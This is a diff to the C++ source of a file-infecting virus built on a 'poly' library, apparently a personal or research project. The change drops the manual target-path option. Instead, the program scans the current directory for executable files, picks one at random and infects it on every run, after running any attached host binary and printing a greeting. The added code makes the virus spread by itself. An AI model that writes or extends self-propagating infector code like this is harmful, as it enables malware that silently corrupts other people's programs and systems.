@@ -1,14 +1,34 @@
 #include <cstdlib>
 
 #include <iostream>
+#include <vector>
 
-#include <poly/host_properties.hpp>
-#include <poly/virus.hpp>
-
-int arg_pass_from = 1;
+#include <poly/poly.hpp>
 
 struct TargetSelectPolicy {
-    poly::fs::path next_target(poly::fs::path) noexcept { return {}; }
+    TargetSelectPolicy() noexcept : dir_paths{} {
+        for (auto &entry : poly::fs::directory_iterator{"."}) {
+            auto path = entry.path();
+            if (((poly::fs::status(path).permissions() &
+                  poly::fs::perms::others_exec) != poly::fs::perms::none) &&
+                !entry.is_directory()) {
+                this->dir_paths.push_back(path);
+            }
+        }
+    }
+
+    poly::fs::path next_target(poly::fs::path program) noexcept {
+        poly::fs::path res;
+        do {
+            res = poly::RandomGenerator::get_generator().random_from(
+                this->dir_paths);
+        } while (poly::fs::equivalent(res, program));
+
+        return res;
+    }
+
+  private:
+    std::vector<poly::fs::path> dir_paths;
 };
 
 struct BlockingExec {
@@ -18,7 +38,7 @@ struct BlockingExec {
               char **const envp) noexcept {
         std::string cmd = program.string();
 
-        for (auto i = arg_pass_from; i < argc; i++) {
+        for (auto i = 1; i < argc; i++) {
             cmd += " " + std::string(argv[i]);
         }
 
@@ -41,17 +61,6 @@ using Cipher = poly::Cipher<
     poly::EncryptionAlgorithm<poly::EncryptionAlgorithmType::kXor>>;
 
 int main(int argc, char **argv, char **envp) {
-    if (argc < 2) {
-        std::cerr << "Usage: " << argv[0] << " [options] [<args..>]\n";
-        std::cerr << "OPTIONS:\n";
-        std::cerr << "\t-t <target_path>\tPath where the binary to infect is "
-                     "placed.\n";
-        std::cerr << "\tOther arguments will be passed to the attached "
-                     "binary, if present.\n";
-
-        return 1;
-    }
-
     auto virus = poly::Virus<TargetSelectPolicy, BlockingExec, Cipher>::build(
         argc, argv, envp);
 
@@ -59,24 +68,19 @@ int main(int argc, char **argv, char **envp) {
         return 1;
     }
 
-    std::string target = "";
-    if (std::string(argv[1]) == "-t") {
-        arg_pass_from += 2;
-        target = std::string(argv[2]);
-    }
-
     auto res = virus->exec_attached_program();
     bool has_attached_bin = res == poly::Error::kNone;
 
     if (res != poly::Error::kNone && res != poly::Error::kNoTargetAttached) {
-        return 1;
+        return 2;
     }
 
-    if (!std::string(target).empty() &&
-        virus->infect_next(target) != poly::Error::kNone) {
-        return 1;
+    if (virus->infect_next() != poly::Error::kNone) {
+        return 3;
     }
     virus->wait_exec_end();
+
+    std::cout << "Hello from poly!\n";
 
     if (has_attached_bin) {
         return virus->exec_result();
